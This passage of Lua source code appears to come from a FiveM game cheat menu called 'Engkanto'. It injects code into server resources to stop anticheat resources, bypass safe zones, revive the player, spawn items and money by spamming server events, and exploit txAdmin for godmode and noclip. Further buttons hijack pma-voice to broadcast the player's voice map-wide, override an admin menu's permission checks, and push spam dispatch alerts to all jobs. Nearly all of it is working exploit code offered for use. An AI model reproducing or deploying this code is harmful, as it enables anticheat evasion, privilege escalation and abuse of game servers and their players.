                    TriggerEvent("Melix:SafeZoneIgnore", true)
                end
            end)
        ]])
        MachoMenuNotification("Engkanto", "SafeArea bypass enabled.")
    end)

    MachoMenuButton(ToolsTabSections[1], "ByPass SafeArea V2", function()
        MachoInjectResource('vrp', [[
            Citizen.CreateThread(function()
                while true do
                    Citizen.Wait(0) 
                    NetworkSetFriendlyFireOption(true)
                    SetCanAttackFriendly(PlayerPedId(), true, true)
                    DisablePlayerFiring(PlayerPedId(), false)
                    EnableAllControlActions(0)
                    EnableAllControlActions(1)
                end
            end)
            
            Citizen.CreateThread(function()
                while true do
                    Citizen.Wait(0) 
                    local playerPed = PlayerPedId()
                    if IsPedInAnyVehicle(playerPed, false) then
                        local vehicle = GetVehiclePedIsIn(playerPed, false)
                        local maxSpeed = 100.0 
                        SetEntityMaxSpeed(vehicle, maxSpeed)
                        SetVehicleEnginePowerMultiplier(vehicle, 1.0) 
                        SetVehicleEngineTorqueMultiplier(vehicle, 1.0) 
                    end
                end
            end)
        ]])
        MachoMenuNotification("Engkanto", "SafeArea bypass V2 enabled.")
    end)

MachoMenuButton(ToolsTabSections[1], "Bypass Eagle (Beta)", function()
    local ecResources = {"EC-PANEL", "EC_AC"}
    for _, resource in ipairs(ecResources) do
        if GetResourceState(resource) == "started" then
            MachoMenuNotification("Eagle AC Detected", "Blocking resource: " .. resource)
            MachoResourceStop(resource)
            MachoMenuNotification("Eagle AC Blocked", "Resource " .. resource .. " stopped.")
        end
    end
end)

-- ServerList Tab
MachoMenuButton(ServerListTabSections[1], "Revive Me", function()
    MachoMenuNotification("Engkanto", "Please wait 2.8s to Revived") 
    Citizen.Wait(2800)
    MachoInjectResource("esx_ambulancejob", [[

        TriggerEvent('esx_ambulancejob:revive')
    ]])
    MachoMenuNotification("Engkanto", "Revived Successfully") 
end)

MachoMenuButton(ServerListTabSections[1], "Heal Me", function()
    MachoInjectResource("esx_basicneeds", [[
        local function HealMe()
            TriggerEvent('esx_basicneeds:healPlayer')
        end
        
        HealMe()
    ]])
end)

MachoMenuButton(ServerListTabSections[1], "Fill Hunger", function()
    MachoInjectResource("esx_status", [[
        local function antigutomV2()
            TriggerEvent('esx_status:set', 'hunger', 1000000)
        end
        
        antigutomV2()
    ]])
end)

MachoMenuButton(ServerListTabSections[1], "Fill Thirst", function()
    MachoInjectResource("esx_status", [[
        local function antiuhawv2()
              TriggerEvent('esx_status:set', 'thirst', 1000000)
        end
        
        antiuhawv2()
    ]])
end)

MachoMenuButton(ServerListTabSections[1], "Remove Stress", function()
    MachoInjectResource("esx_status", [[
        local function antistress()
              TriggerEvent('esx_status:set', 'stress', 0)
        end
        
        antistress()
    ]])
end)

MachoMenuButton(ServerListTabSections[1], "Reset Status", function()
    MachoInjectResource("esx_basicneeds", [[
        local function reset()
            TriggerEvent('esx_basicneeds:resetStatus')
        end
        
        reset()
    ]])
end)

MachoMenuButton(ServerListTabSections[1], "Bypass Drivers License", function()
    MachoInjectResource("esx_dmvschool", [[
        local function license()
            TriggerServerEvent('esx_dmvschool:addLicense', 'dmv')
        end
        
        license()
    ]])
end)

MachoMenuButton(ServerListTabSections[1], "Bypass Weapon License", function()
    MachoInjectResource("esx_dmvschool", [[
        local function weaponlicense()
            TriggerServerEvent('esx_dmvschool:addLicense', 'weapon') 
        end
        
        weaponlicense()
    ]])
end)

MachoMenuText(ServerListTabSections[1], "Pacific Bay")

MachoMenuButton(ServerListTabSections[1], "Spawn Recyling [RANDOM]", function()
    MachoInjectResource("svcycle", [[
TriggerServerEvent('svcycle:GetRandomItems')
TriggerServerEvent('svcycle:GetRandomItems')
TriggerServerEvent('svcycle:GetRandomItems')
TriggerServerEvent('svcycle:GetRandomItems')
TriggerServerEvent('svcycle:GetRandomItems')
TriggerServerEvent('svcycle:GetRandomItems')
TriggerServerEvent('svcycle:GetRandomItems')
TriggerServerEvent('svcycle:GetRandomItems')
TriggerServerEvent('svcycle:GetRandomItems')
TriggerServerEvent('svcycle:GetRandomItems')
TriggerServerEvent('svcycle:GetRandomItems')
TriggerServerEvent('svcycle:GetRandomItems')
TriggerServerEvent('svcycle:GetRandomItems')
TriggerServerEvent('svcycle:GetRandomItems')
TriggerServerEvent('svcycle:GetRandomItems')
TriggerServerEvent('svcycle:GetRandomItems')
TriggerServerEvent('svcycle:GetRandomItems')
TriggerServerEvent('svcycle:GetRandomItems')
TriggerServerEvent('svcycle:GetRandomItems')
TriggerServerEvent('svcycle:GetRandomItems')
TriggerServerEvent('svcycle:GetRandomItems')
TriggerServerEvent('svcycle:GetRandomItems')
TriggerServerEvent('svcycle:GetRandomItems')
TriggerServerEvent('svcycle:GetRandomItems')
TriggerServerEvent('svcycle:GetRandomItems')
TriggerServerEvent('svcycle:GetRandomItems')
TriggerServerEvent('svcycle:GetRandomItems')
TriggerServerEvent('svcycle:GetRandomItems')
TriggerServerEvent('svcycle:GetRandomItems')
TriggerServerEvent('svcycle:GetRandomItems')
TriggerServerEvent('svcycle:GetRandomItems')
TriggerServerEvent('svcycle:GetRandomItems')
TriggerServerEvent('svcycle:GetRandomItems')
TriggerServerEvent('svcycle:GetRandomItems')
TriggerServerEvent('svcycle:GetRandomItems')
TriggerServerEvent('svcycle:GetRandomItems')
TriggerServerEvent('svcycle:GetRandomItems')
TriggerServerEvent('svcycle:GetRandomItems')
TriggerServerEvent('svcycle:GetRandomItems')
TriggerServerEvent('svcycle:GetRandomItems')
]])
end)

MachoMenuButton(ServerListTabSections[1], "Spawn Mining", function()
    MachoInjectResource("svgrindings", [[
TriggerServerEvent('svgrindings:GiveReward', "mining")
]])
end)

MachoMenuButton(ServerListTabSections[1], "Spawn Scarpmetal", function()
    MachoInjectResource("svgrindings", [[
TriggerServerEvent('svgrindings:GiveReward', "steel")
Citizen.Wait(3600)
]])
end)

MachoMenuButton(ServerListTabSections[1], "Spawn Weed", function()
    MachoInjectResource("svgrindings", [[
TriggerServerEvent('svgrindings:GiveReward', "weed")
]])
end)

MachoMenuButton(ServerListTabSections[1], "Spawn Tomato", function()
    MachoInjectResource("svgrindings", [[
TriggerServerEvent('svgrindings:GiveReward', "tomato")
]])
end)

MachoMenuButton(ServerListTabSections[1], "Spawn Arabica", function()
    MachoInjectResource("svgrindings", [[
TriggerServerEvent('svgrindings:GiveReward', "arabica")
]])
end)

MachoMenuButton(ServerListTabSections[1], "Spawn Pumpkin", function()
    MachoInjectResource("svgrindings", [[
TriggerServerEvent('svgrindings:GiveReward', "pumpkin")
]])
end)

MachoMenuButton(ServerListTabSections[1], "Spawn Onion", function()
    MachoInjectResource("svgrindings", [[
TriggerServerEvent('svgrindings:GiveReward', "onion")
]])
end)


MachoMenuText(ServerListTabSections[1], "Yakuza")

MachoMenuButton(ServerListTabSections[1], "Remove Community Service", function()
    MachoInjectResource("cfx-ekaj-community", [[
TriggerServerEvent('cfx-ekaj-community:serviceUpdate', 3, 1)
]])
end)

MachoMenuButton(ServerListTabSections[1], "Revive Me", function()
    MachoInjectResource("cfx-ekaj-ambulance", [[
        local function ReviveMe()
            TriggerEvent('cfx-ekaj-ambulance:revive')
        end
        
        ReviveMe()
    ]])
end)

MachoMenuButton(ServerListTabSections[1], "Remove Bleed", function()
    MachoInjectResource("cfx-ekaj-farm", [[
        local function RemoveBleed()
            TriggerEvent('cfx-ekaj-injuries:client:ResetLimbs')
            TriggerEvent('cfx-ekaj-injuries:client:RemoveBleed')
        end
        
        RemoveBleed()
    ]])
end)

MachoMenuButton(ServerListTabSections[1], "Spawn Mining Ore", function()
    MachoInjectResource("cfx-ekaj-farm", [[
TriggerServerEvent('cfx-ekaj-farm:mining:harvest', 1)
]])
end)

MachoMenuButton(ServerListTabSections[1], "Wash Mining Ore", function()
    MachoInjectResource("cfx-ekaj-farm", [[
TriggerServerEvent('cfx-ekaj-farm:mining:wash', "washed_copper", 4) 
TriggerServerEvent('cfx-ekaj-farm:mining:wash', "washed_gold", 4) 
TriggerServerEvent('cfx-ekaj-farm:mining:wash', "washed_silver", 4)
TriggerServerEvent('cfx-ekaj-farm:mining:wash', "washed_iron", 4)
]])
end)

MachoMenuButton(ServerListTabSections[1], "Melt Mining Ore", function()
    MachoInjectResource("cfx-ekaj-farm", [[
TriggerServerEvent('cfx-ekaj-farm:mining:melt', "iron", 1)
TriggerServerEvent('cfx-ekaj-farm:mining:melt', "gold", 1)
TriggerServerEvent('cfx-ekaj-farm:mining:melt', "copper", 1)
TriggerServerEvent('cfx-ekaj-farm:mining:melt', "silver", 1)
]])
end)

MachoMenuButton(ServerListTabSections[1], "Spawn Raven's Meat", function()
    MachoInjectResource("cfx-ekaj-farm", [[
TriggerServerEvent('cfx-ekaj-farm:ravens:action', "Harvest", 1)
TriggerServerEvent('cfx-ekaj-farm:ravens:action', "Harvest", 1)
TriggerServerEvent('cfx-ekaj-farm:ravens:action', "Harvest", 1)
TriggerServerEvent('cfx-ekaj-farm:ravens:action', "Harvest", 1)
]])
end)

MachoMenuButton(ServerListTabSections[1], "Spawn Scrapyard Items (random)", function()
    MachoInjectResource("cfx-ekaj-farm", [[
        local function ScrapYard()
            TriggerServerEvent('cfx-ekaj-farm:ScrapMetal:Process')
        end
        ScrapYard()
    ]])
end)

MachoMenuButton(ServerListTabSections[1], "Spawn Onion", function()
    MachoInjectResource("cfx-ekaj-farm", [[
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "onion", 1, "Onion")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "onion", 2, "Onion")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "onion", 3, "Onion")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "onion", 4, "Onion")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "onion", 5, "Onion")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "onion", 6, "Onion")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "onion", 7, "Onion")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "onion", 8, "Onion")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "onion", 9, "Onion")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "onion", 10, "Onion")
]])
end)

MachoMenuButton(ServerListTabSections[1], "Spawn Wheat", function()
    MachoInjectResource("cfx-ekaj-farm", [[
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "wheat", 1, "Wheat")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "wheat", 2, "Wheat")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "wheat", 3, "Wheat")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "wheat", 4, "Wheat")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "wheat", 5, "Wheat")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "wheat", 6, "Wheat")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "wheat", 7, "Wheat")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "wheat", 8, "Wheat")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "wheat", 9, "Wheat")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "wheat", 9, "Wheat")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "wheat", 10, "Wheat")
]])
end)

MachoMenuButton(ServerListTabSections[1], "Spawn Potato", function()
    MachoInjectResource("cfx-ekaj-farm", [[
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "potato", 1, "Potato")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "potato", 2, "Potato")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "potato", 3, "Potato")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "potato", 4, "Potato")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "potato", 5, "Potato")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "potato", 6, "Potato")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "potato", 7, "Potato")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "potato", 8, "Potato")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "potato", 9, "Potato")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "potato", 10, "Potato")
]])
end)

MachoMenuButton(ServerListTabSections[1], "Spawn Lettuce", function()
    MachoInjectResource("cfx-ekaj-farm", [[
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "lettuce", 1, "Lettuce")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "lettuce", 2, "Lettuce")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "lettuce", 3, "Lettuce")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "lettuce", 4, "Lettuce")  
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "lettuce", 5, "Lettuce")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "lettuce", 6, "Lettuce")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "lettuce", 7, "Lettuce")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "lettuce", 8, "Lettuce")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "lettuce", 9, "Lettuce")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "lettuce", 10, "Lettuce")  
]])
end)


MachoMenuButton(ServerListTabSections[1], "Spawn Arabica", function()
    MachoInjectResource("cfx-ekaj-farm", [[
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "arabica", 1, "Arabica")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "arabica", 2, "Arabica")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "arabica", 3, "Arabica")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "arabica", 4, "Arabica")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "arabica", 5, "Arabica")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "arabica", 6, "Arabica")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "arabica", 7, "Arabica")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "arabica", 8, "Arabica")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "arabica", 9, "Arabica")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "arabica", 10, "Arabica")
]])
end)

MachoMenuButton(ServerListTabSections[1], "Spawn Tomato", function()
    MachoInjectResource("cfx-ekaj-farm", [[
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "tomato", 1, "Tomato")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "tomato", 2, "Tomato")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "tomato", 3, "Tomato")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "tomato", 4, "Tomato")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "tomato", 5, "Tomato")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "tomato", 6, "Tomato")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "tomato", 7, "Tomato")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "tomato", 8, "Tomato")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "tomato", 9, "Tomato")
TriggerServerEvent('cfx-ekaj-farm:farm:harvest', "tomato", 10, "Tomato")
]])
end)

MachoMenuText(ServerListTabSections[1], "CFX HU Servers")

local ItemInputHandle = MachoMenuInputbox(ServerListTabSections[1], "Item Spawn Name", "Money")
local selectedAmount = 1

MachoMenuSlider(ServerListTabSections[1], "Spawn Amount", 1, 1, 20000000, "", 0, function(Value)
    selectedAmount = Value
end)

MachoMenuButton(ServerListTabSections[1], "Spawn Item", function()
    local itemName = MachoMenuGetInputbox(ItemInputHandle)
    
    if itemName ~= "" and itemName ~= "Money" then
        -- The Injection Trigger
        local payload = string.format([[
            for i = 1, %d do
                TriggerServerEvent('cfx-hu-grindings:AddItem', '%d', math.random( ), '%d', GlobalState.Token)
            end
        ]], selectedAmount, itemName)

        MachoInjectResource2(3, "cfx-hu-grindings", payload)
    end
end)


MachoMenuButton(ServerListTabSections[1], "Remove Bleeding", function()
    MachoInjectResource("cfx-hu-injury", [[
        local function RemoveBleeding()
            TriggerEvent('cfx-hu-injury:client:RemoveBleed')
        end
        
        RemoveBleeding()
    ]])
end)

MachoMenuButton(ServerListTabSections[1], "Remove Bleeding V2", function()
    MachoInjectResource("cfx-hu-injury", [[
        local function RemoveBleedingV2()
            TriggerEvent('cfx-hu-injury:client:ResetLimbs')
        end
        
        RemoveBleedingV2()
    ]])
end)

MachoMenuButton(ServerListTabSections[1], "Remove Bleeding V3", function()
    MachoInjectResource("cfx-hu-injury", [[
        local function RemoveBleedingV3()
            TriggerEvent('cfx-hu-injury:client:FieldTreatBleed')
        end
        
        RemoveBleedingV3()
    ]])
end)

-- OtherExploits Tab
MachoMenuCheckbox(OtherExploitsTabSections[1], "TxAdmin Noclip", function()
    TriggerEvent('txcl:setPlayerMode', "noclip", true)
    MachoMenuNotification("Engkanto", "TxAdmin Noclip Enable")
end, function()
    TriggerEvent('txcl:setPlayerMode', "none", true)
    MachoMenuNotification("Engkanto", "TxAdmin Noclip Disable")
end)

MachoMenuCheckbox(OtherExploitsTabSections[1], "TxAdmin Godmode", 
 
    function()
        MachoInjectResource("monitor", [[
            _G.txGodModeMaster = true
            
           
            if not _G.txFunctionsLoaded then
                local function sendMenuMessage(action, data)
                    SendNUIMessage({ action = action, data = data })
                end

                _G.sendPersistentAlert = function(key, level, message, isTranslationKey)
                    sendMenuMessage('setPersistentAlert', { key = key, level = level, message = message, isTranslationKey = isTranslationKey })
                end

                _G.clearPersistentAlert = function(key)
                    sendMenuMessage('clearPersistentAlert', { key = key })
                end
                _G.txFunctionsLoaded = true
            end

        
            Citizen.CreateThread(function()
                _G.sendPersistentAlert('godModeEnabled', 'info', 'God Mode: Enabled', false)
                
                while _G.txGodModeMaster do
                    local ped = PlayerPedId()
                    
                
                    SetEntityInvincible(ped, true)
                    SetPlayerInvincible(PlayerId(), true)
                    SetPedCanRagdoll(ped, false)
                    SetEntityProofs(ped, true, true, true, true, true, true, true, true)
                    
            
                    SetEntityHealth(ped, GetEntityMaxHealth(ped))
                    
                    Wait(0)
                end
                
            
                local ped = PlayerPedId()
                SetEntityInvincible(ped, false)
                SetPlayerInvincible(PlayerId(), false)
                SetPedCanRagdoll(ped, true)
                SetEntityProofs(ped, false, false, false, false, false, false, false, false)
                _G.clearPersistentAlert('godModeEnabled')
            end)
        ]])
    end,

 
    function()
        MachoInjectResource("monitor", [[
            _G.txGodModeMaster = false
        ]])
    end
)

MachoMenuCheckbox(OtherExploitsTabSections[1], "TxAdmin Toggle ID", function()

        MachoInjectResource('monitor', [[
            _G.TxIdsActive = true 
            _G.PlayerGamerTags = _G.PlayerGamerTags or {}

            local function CleanTags()
                for pid, data in pairs(_G.PlayerGamerTags) do
                    if IsMpGamerTagActive(data.gamerTag) then
                        RemoveMpGamerTag(data.gamerTag)
                    end
                end
                _G.PlayerGamerTags = {}
            end


            if sendSnackbarMessage then
                sendSnackbarMessage('info', 'nui_menu.page_main.player_ids.alert_show', true)
            end

            Citizen.CreateThread(function()
                while _G.TxIdsActive and not Unloaded do
                    local curCoords = GetEntityCoords(PlayerPedId())
                    local distanceToCheck = GetConvarInt('txAdmin-menuPlayerIdDistance', 150)

                    for _, pid in ipairs(GetActivePlayers()) do
                        local targetPed = GetPlayerPed(pid)
                        if DoesEntityExist(targetPed) then
                            -- Logic para sa paglikha at pag-update ng GamerTags (Names + IDs)
                            if not _G.PlayerGamerTags[pid] or _G.PlayerGamerTags[pid].ped ~= targetPed or not IsMpGamerTagActive(_G.PlayerGamerTags[pid].gamerTag) then
                                local playerName = string.sub(GetPlayerName(pid) or "unknown", 1, 75)
                                local playerStr = '[' .. GetPlayerServerId(pid) .. ']' .. ' ' .. playerName
                                
                                _G.PlayerGamerTags[pid] = {
                                    gamerTag = CreateFakeMpGamerTag(targetPed, playerStr, false, false, 0),
                                    ped = targetPed
                                }
                            end

                            local tag = _G.PlayerGamerTags[pid].gamerTag
                            if #(GetEntityCoords(targetPed) - curCoords) <= distanceToCheck then
                                SetMpGamerTagVisibility(tag, 0, true) -- Name
                                SetMpGamerTagVisibility(tag, 2, true) -- Health bar
                                SetMpGamerTagAlpha(tag, 2, 255)
                                
                                SetMpGamerTagHealthBarColor(tag, 129) 
                                SetMpGamerTagColour(tag, 0, 0) 

                                if NetworkIsPlayerTalking(pid) then
                                    SetMpGamerTagVisibility(tag, 4, true) -- Audio icon
                                    SetMpGamerTagColour(tag, 0, 12) 
                                else
                                    SetMpGamerTagVisibility(tag, 4, false)
                                    SetMpGamerTagColour(tag, 0, 0)
                                end
                            else

                                SetMpGamerTagVisibility(tag, 0, false)
                                SetMpGamerTagVisibility(tag, 2, false)
                                SetMpGamerTagVisibility(tag, 4, false)
                            end
                        end
                    end
                    Wait(250)
                end
                CleanTags()
            end)
        ]])
    end,

    function()

        MachoInjectResource('monitor', [[
            _G.TxIdsActive = false
            if sendSnackbarMessage then
                sendSnackbarMessage('info', 'nui_menu.page_main.player_ids.alert_hide', true)
            end
        ]])
    end
)

MachoMenuCheckbox(OtherExploitsTabSections[1], "TxAdmin SuperJump", 
    function()
        MachoInjectResource("monitor", [[
            _G.txSuperJumpMaster = true
            
            if not _G.txFunctionsLoaded then
                local function sendMenuMessage(action, data)
                    SendNUIMessage({ action = action, data = data })
                end

                _G.sendPersistentAlert = function(key, level, message, isTranslationKey)
                    sendMenuMessage('setPersistentAlert', { key = key, level = level, message = message, isTranslationKey = isTranslationKey })
                end

                _G.clearPersistentAlert = function(key)
                    sendMenuMessage('clearPersistentAlert', { key = key })
                end
                _G.txFunctionsLoaded = true
            end

            Citizen.CreateThread(function()
                _G.sendPersistentAlert('superJumpEnabled', 'info', 'Super Jump: Enabled', false)
                
                local moveRateOverride = 1.75 
                
                while _G.txSuperJumpMaster do
                    local player = PlayerId()
                    local ped = PlayerPedId()
          
                    SetSuperJumpThisFrame(player)

                    SetEntityMaxSpeed(ped, 100.0) 
                    
                    SetPedMoveRateOverride(ped, moveRateOverride)
                    RestorePlayerStamina(player, 100.0)
                    
                    Wait(0)
                end
                
                _G.clearPersistentAlert('superJumpEnabled')
                SetPedMoveRateOverride(PlayerPedId(), 1.0)
            end)
        ]])
    end,

    function()
        MachoInjectResource("monitor", [[
            _G.txSuperJumpMaster = false
        ]])
    end
)  
 
MachoMenuButton(OtherExploitsTabSections[1], "TxAdmin Teleport to Waypoint", function()
        TriggerEvent("txcl:tpToWaypoint")
    end)    

MachoMenuButton(OtherExploitsTabSections[1], "TxAdmin Heal Me", function()
        TriggerEvent("txcl:healMyself")
    end)  
   
MachoMenuButton(OtherExploitsTabSections[1], "TxAdmin Fix car", function()
        TriggerEvent('txcl:vehicle:fix')
    end)  

MachoMenuButton(OtherExploitsTabSections[1], "TxAdmin Boost car", function()
        TriggerEvent('txcl:vehicle:boost')
    end)

MachoMenuText(OtherExploitsTabSections[1], "PMA VOICE EXPLOIT")  

MachoMenuCheckbox(OtherExploitsTabSections[1], "Voice Hack", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
    local function startMegaphoneThread()
    CreateThread(function()
        local normalRange = 15.0
        local megaRange   = 800.0
        local applied = false
        local myId = PlayerId()
        local intentSet = false

        while true do
            if GetResourceState('pma-voice') == 'started' and exports and exports['pma-voice'] then
                if not intentSet then
                    pcall(function() MumbleSetAudioInputIntent(GetHashKey("music")) end)
                    intentSet = true
                end
                if not applied and exports['pma-voice'].overrideProximityCheck then
                    pcall(function()
                        exports['pma-voice']:overrideProximityCheck(function(ply)
                            if ply == myId then return false end
                            -- Always allow voice target (no talk/distance checks)
                            return true
                        end)
                    end)
                    applied = true
                end
            else
                if applied and exports and exports['pma-voice'] and exports['pma-voice'].resetProximityCheck then
                    pcall(function() exports['pma-voice']:resetProximityCheck() end)
                end
                applied = false
                intentSet = false
            end
            Wait(300)
        end
    end)
end
    ]])
end)

MachoMenuCheckbox(OtherExploitsTabSections[1], "Voice Hack II", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
local ok = pcall(function()
 CreateThread(function()
            local normalRange = 15.0
            local megaRange   = 800.0
            local applied = false
            local myId = PlayerId()
            local intentSet = false

            while true do
                if GetResourceState('pma-voice') == 'started' and exports and exports['pma-voice'] then
                    if not intentSet then
                        pcall(function() MumbleSetAudioInputIntent(GetHashKey("music")) end)
                        intentSet = true
                    end
                    if not applied and exports['pma-voice'].overrideProximityCheck then
                        pcall(function()
                            exports['pma-voice']:overrideProximityCheck(function(ply)
                                if ply == myId then return false end
                                -- Always allow voice target (no talk/distance checks)
                                return true
                            end)
                        end)
                        applied = true
                    end
                else
                    if applied and exports and exports['pma-voice'] and exports['pma-voice'].resetProximityCheck then
                        pcall(function() exports['pma-voice']:resetProximityCheck() end)
                    end
                    applied = false
                    intentSet = false
                end
                Wait(300)
            end
        end)
    ]])
end)

MachoMenuCheckbox(OtherExploitsTabSections[1], "Voice Hack III", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
VoiceExploitEnabled = true
        CreateThread(function()
            local myId = PlayerId()
            local currentVoiceRange = 564660.0
            local knownPlayers = {}
            pcall(function() MumbleSetAudioInputIntent(GetHashKey("music")) end)
            NetworkSetTalkerProximity(currentVoiceRange + 700.0)
            local players = GetActivePlayers()
            for _, player in ipairs(players) do
                if player ~= myId then
                    SetPlayerTalkingOverride(player, true)
                    MumbleSetVolumeOverride(player, 1.0)
                    knownPlayers[player] = true
                end
            end
            while VoiceExploitEnabled do
                Wait(2000)
                NetworkSetTalkerProximity(currentVoiceRange + 700.0)
                local players = GetActivePlayers()
                for _, player in ipairs(players) do
                    if player ~= myId and not knownPlayers[player] then
                        SetPlayerTalkingOverride(player, true)
                        MumbleSetVolumeOverride(player, 1.0)
                        knownPlayers[player] = true
                    end
                end
            end
        end)
        ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        VoiceExploitEnabled = false
    ]])
end)

MachoMenuText(OtherExploitsTabSections[1], "Admin Menu's Exploit")

 MachoMenuButton(OtherExploitsTabSections[1], "Staff (1) (BETA) - Menu", function()
    if not HasValidStaffKey() then return end

    if CheckResource("mc9-adminmenu") then
        MachoInjectResource2(2, 'mc9-adminmenu', [[
            _G.lib = _G.lib or lib
            _G.QBCore = _G.QBCore or exports['qb-core']:GetCoreObject()

            _G.lib.callback.register("mc9-adminmenu:callback:GetAllowedActions", function()
                local all = {}
                for k, v in pairs(_G.Config.Actions) do
                    all[k] = true
                end
                return all
            end)

            _G.CheckPerms = function(_)
                return true
            end

            _G.setupMenu = function()
                _G.PlayerData = _G.QBCore.Functions.GetPlayerData()
                _G.QBCore.Shared.Vehicles = _G.lib.callback.await("mc9-adminmenu:callback:GetSharedVehicles", false)
                _G.resources = _G.lib.callback.await("mc9-adminmenu:callback:GetResources", false)
                _G.commands = _G.lib.callback.await("mc9-adminmenu:callback:GetCommands", false)
                _G.GetData()

                _G.actions = {}
                for k, v in pairs(_G.Config.Actions) do
                    _G.actions[k] = v
                end

                _G.playerActions = {}
                for k, v in pairs(_G.Config.PlayerActions or {}) do
                    _G.playerActions[k] = v
                end

                _G.otherActions = {}
                for k, v in pairs(_G.Config.OtherActions or {}) do
                    _G.otherActions[k] = v
                end

                _G.SendNUIMessage({
                    action = "setupUI",
                    data = {
                        actions = _G.actions,
                        playerActions = _G.playerActions,
                        otherActions = _G.otherActions,
                        resources = _G.resources,
                        playerData = _G.PlayerData,
                        commands = _G.commands,
                        weapons = _G.QBCore.Shared.Weapons,
                    }
                })

                _G.uiReady = true
            end

            _G.setupMenu()
            _G.ToggleUI(true)
        ]])
    else
        MachoMenuNotification("Engkanto", "Resource Not Found.")
    end
end)

MachoMenuButton(OtherExploitsTabSections[1], "Staff (2) (BETA) - Announce", function()
    if not HasValidStaffKey() then return end

    if CheckResource("ps-dispatch") then
        MachoInjectResource2(2, 'ps-dispatch', [[
            local AllJobs = {
                'police','sheriff','state','ranger','ambulance','ems','doc','doj',
                'mechanic','bennys','lsc','tow','taxi','bus','trucker','garbage',
                'news','realestate','cardealer','gruppe6','casino','government','judge','lawyer',
                'unemployed'
            }

            local data = {
                message = 'Engkanto is here!! HAPPY RP!',
                codeName = 'x9_blast',
                code = 'discord.gg/Engkanto!',
                icon = 'fas fa-bullhorn',
                priority = 1,
                coords = vector3(0.0, 0.0, 0.0),
                alertTime = 9999,
                jobs = AllJobs,
                alert = { radius=200, sprite=84, color=1, scale=2.0, length=15, flash=true }
            }

            local function WoodyBETA()
                _G.Twiga = TriggerServerEvent
                _G.Twiga('ps-dispatch:server:notify', data)
            end

            WoodyBETA()
        ]])
    else
        MachoMenuNotification("Engkanto YOU PHOR DESTROYER", "Resource Not Found.")
    end
end)

MachoMenuText(OtherExploitsTabSections[1], "Other")

local YTLinkInput = MachoMenuInputbox(OtherExploitsTabSections[1], "YouTube Link:", "https://www.youtube.com")
local DistanceInput = MachoMenuInputbox(OtherExploitsTabSections[1], "Distance (Meters):", "300")
local VolumeInput = MachoMenuInputbox(OtherExploitsTabSections[1], "Volume (1-100):", "50")

MachoMenuButton(OtherExploitsTabSections[1], "Play Music (Wasabi)", function()
    local link = MachoMenuGetInputbox(YTLinkInput)
    local distRaw = MachoMenuGetInputbox(DistanceInput)
    local volRaw = MachoMenuGetInputbox(VolumeInput)
    
    local distance = tonumber(distRaw) or 300.0
    local volume = tonumber(volRaw) or 50.0

    MachoInjectResource("wasabi_boombox", [[
        local ped = PlayerPedId()
